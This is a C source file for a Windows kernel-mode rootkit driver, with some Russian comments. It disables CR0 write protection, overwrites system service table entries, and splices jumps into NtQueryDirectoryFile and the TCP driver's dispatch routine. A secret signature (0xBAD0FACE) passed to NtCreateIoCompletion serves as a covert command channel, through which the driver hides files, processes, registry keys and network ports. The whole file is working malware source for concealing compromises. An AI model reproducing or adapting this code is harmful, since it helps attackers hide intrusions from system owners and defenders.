#include "inc.h"
#include "proc.h"
#include "command.h"
#include "net.h"
#include "file.h"
#include "key.h"

typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    PULONG_PTR Base;        // массив адресов системных вызовов(сервисов)
    PULONG Count;           // массив счётчиков вызовов сервисов
    ULONG Limit;            // количество вызовов в таблице
    PUCHAR Number;          // массив количества параметров вызовов(в байтах)
} KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;


typedef NTSTATUS (*NT_CREATE_IO_COMPLETION)(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04
);

#define NUMBER_NT_CREATE_IO_COMPLETION  0x26 //38
#define SYSCALL_SIGNATURE  0xBAD0FACE

NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp);
VOID DriverUnload(IN PDRIVER_OBJECT dob);

ULONG_PTR HookNtCreateIoCompletion(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04
);
BOOLEAN CheckHookProlog(PUCHAR adr);
ULONG SplicingSyscall(ULONG addressSyscall,
    void* addressHooker,
    PUCHAR saveBytes,
    BOOLEAN noCheck,
    ULONG skipCount);
void UnhookSyscall(PUCHAR addressSyscall, PUCHAR saveBytes);

NT_CREATE_IO_COMPLETION glRealNtCreateIoCompletion;
extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;

ULONG ClearWP(void) {

    ULONG reg = 0;

    __asm {
        mov eax, cr0
        mov[reg], eax
        and eax, 0xFFFEFFFF
        mov cr0, eax
    }

    return reg;
}


void WriteCR0(ULONG reg) {

    __asm {
        mov eax, [reg]
        mov cr0, eax
    }

}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {

    ULONG reg;
    NTSTATUS status;

#if DBG
    DbgPrint("Load driver %wZ\n", &dob->DriverName);
    DbgPrint("Registry path %wZ\n", rgp);
#endif

    glRealNtCreateIoCompletion = (NT_CREATE_IO_COMPLETION)KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION];
    glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];
    //glRealNtQueryDirectoryFile = (NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE];
    glRealNtEnumerateKey = (NT_ENUMERATE_KEY)KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY];


    // Init splicing hook IRP for net
    status = InstallTCPDriverHook(L"\\Device\\Tcp");
    if (!NT_SUCCESS(status)) {
        return status;
    }



    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)HookNtCreateIoCompletion;
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)HookNtQueryDirectoryFile;
    KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)HookNtEnumerateKey;
    WriteCR0(reg);

    // Init task list for rename process
    ExInitializePagedLookasideList(&glPagedTaskQueueProcess, NULL, NULL, 0, sizeof(TASK_QUEUE_PROCESS), ' LFO', 0);
    InitializeListHead(&glTaskQueueProcess);
    //

    // Init task list for hide file
    addressForJmpNtNtQueryDirectoryFile = SplicingSyscall(
        KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE],
        HookNtQueryDirectoryFile,
        saveByteNtQueryDirectoryFile,
        TRUE,
        0
    );
    ExInitializePagedLookasideList(&glPagedTaskQueueFile, NULL, NULL, 0, sizeof(TASK_QUEUE_FILE), ' LFO', 0);
    InitializeListHead(&glTaskQueueFile);
    //

    // Init task list for add key
    ExInitializePagedLookasideList(&glPagedTaskQueueKey, NULL, NULL, 0, sizeof(TASK_QUEUE_KEY), ' LFO', 0);
    InitializeListHead(&glTaskQueueKey);
    //

    // Init task list for net
    ExInitializePagedLookasideList(&glPagedTaskQueueNet, NULL, NULL, 0, sizeof(TASK_QUEUE_NET), ' LFO', 0);
    InitializeListHead(&glTaskQueueNet);
    //

    dob->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT dob) {

    ULONG reg;

#if DBG
    DbgPrint("Driver unload\n");
#endif

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)glRealNtCreateIoCompletion;
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)glRealNtQueryDirectoryFile;
    KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)glRealNtEnumerateKey;
    WriteCR0(reg);

    //free list for rename process
    FreeListQueueProcess();
    ExDeletePagedLookasideList(&glPagedTaskQueueProcess);
    //

    //free list for hide file
    if (addressForJmpNtNtQueryDirectoryFile) {
        UnhookSyscall(
            (PUCHAR)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE],
            saveByteNtQueryDirectoryFile
        );
    }
    FreeListQueueFilename();
    ExDeletePagedLookasideList(&glPagedTaskQueueFile);
    while(SyscallProcessedCount);
    //

    //free list for add key
    FreeTaskQueueKeyList();
    ExDeletePagedLookasideList(&glPagedTaskQueueKey);
    //

    //free list for net
    FreeTaskQueueKeyList();
    ExDeletePagedLookasideList(&glPagedTaskQueueNet);
    //

    if (glRealIrpMjDeviceControl) {
        pTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = glRealIrpMjDeviceControl;
    }
    if (pTcpFile != NULL) {
        ObDereferenceObject(pTcpFile);
    }


    return;
}

ULONG_PTR HookNtCreateIoCompletion(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04)
{
    PCOMMAND pCmd;
    NTSTATUS retStatus = STATUS_SUCCESS;
    
    if ((ULONG)arg_01 == (ULONG)SYSCALL_SIGNATURE) {
        pCmd = (PCOMMAND)arg_02;
        if (pCmd->flags & COMMAND_TEST_COMMAND) {
            DbgPrint("HookNtCreateIoCompletion execute\n");
        }
        else if (pCmd->flags & COMMAND_RENAME_PROCESS) {
            ULONG len = 0;

            if (pCmd->flags & COMMAND_BUFFER_NUMBER && pCmd->change != NULL) {

                DbgPrint("RenameProcess PID:%d change:%s\n", (ULONG)pCmd->target, (PCHAR)pCmd->change);
                TaskQueueByPID((ULONG)pCmd->target, (PCHAR)pCmd->change);

            }
            else if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL && pCmd->change != NULL) {

                DbgPrint("RenameProcess name:%s change:%s\n", (PCHAR)pCmd->target, (PCHAR)pCmd->change);
                TaskQueueByName((PCHAR)pCmd->target, (PCHAR)pCmd->change);

            }
        }
        else if (pCmd->flags & COMMAND_HIDE_FILE) {
            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL) {
                
                DbgPrint("Hide file command for %s\n", (PCHAR)pCmd->target);
                TaskQueueByFilename((PCHAR)pCmd->target);

            }

        }
        else if (pCmd->flags & COMMAND_RENAME_KEY) {
            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL && pCmd->change != NULL) {

                DbgPrint("For key:%s add key:%s\n", (PCHAR)pCmd->target, (PCHAR)pCmd->change);
                TaskQueueByKey((PCHAR)pCmd->target, (PCHAR)pCmd->change);

            }
        }
        else if (pCmd->flags & COMMAND_HIDE_NET) {
            DbgPrint("Hide network\n");
            if (pCmd->flags & COMMAND_BUFFER_SRC_PORT) {
                TaskQueueByNet((ULONG)pCmd->target, TRUE);
            }
            else if (pCmd->flags & COMMAND_BUFFER_DST_PORT) {
                TaskQueueByNet((ULONG)pCmd->target, FALSE);
            }
        }
        else {
            DbgPrint("No dispatch for command with flag %d\n", pCmd->flags);
        }
        //PrintTaskQueueProcessList();
        //PrintTaskQueueFileList();
        //PrintTaskQueueKeyList();
        PrintTaskQueueNetList();
    }
    else {
        retStatus = glRealNtCreateIoCompletion(
            arg_01,
            arg_02,
            arg_03,
            arg_04
        );

        //DbgPrint("arg_01 0x%08X\narg_02 0x%08X\narg_03 0x%08X\narg_04 0x%08X\n",
        //    arg_01, arg_02, arg_03, arg_04);
    }

    return retStatus;
}

ULONG SplicingSyscall(ULONG addressSyscall, void* addressHooker, PUCHAR saveBytes, BOOLEAN noCheck, ULONG skipCount) {


    ULONG reg;
    unsigned int i;


    if (noCheck && !CheckHookProlog((PUCHAR)addressSyscall)) {
        return 0;
    }

    for (i = 0; i < 5; ++i) {
        saveBytes[i] = ((PUCHAR)addressSyscall)[i];
    }

    reg = ClearWP();
    ((PUCHAR)addressSyscall)[0] = 0xE9;
    *((PULONG)(addressSyscall + 1)) = (ULONG)addressHooker - (addressSyscall + 5);
    WriteCR0(reg);

    if (skipCount)
        return addressSyscall + skipCount;
    else
        return addressSyscall + 5;
}


//--------------------



void UnhookSyscall(PUCHAR addressSyscall, PUCHAR saveBytes) {


    unsigned int i;
    ULONG reg;

    reg = ClearWP();
    for (i = 0; i < 5; ++i) {
        addressSyscall[i] = saveBytes[i];
    }
    WriteCR0(reg);

    return;
}

//
// Проверяет находится ли по адресу adr
// стандартный пролог:
// mov     edi, edi
// push    ebp
// mov     ebp, esp
//
BOOLEAN CheckHookProlog(PUCHAR adr) {

    static UCHAR hookProlog[5] = { 0x8B,0xFF,0x55,0x8B,0xEC };

    if ((adr[0] == hookProlog[0]) &&
        (adr[1] == hookProlog[1]) &&
        (adr[2] == hookProlog[2]) &&
        (adr[3] == hookProlog[3]) &&
        (adr[4] == hookProlog[4]))
        return TRUE;
    else
        return FALSE;

}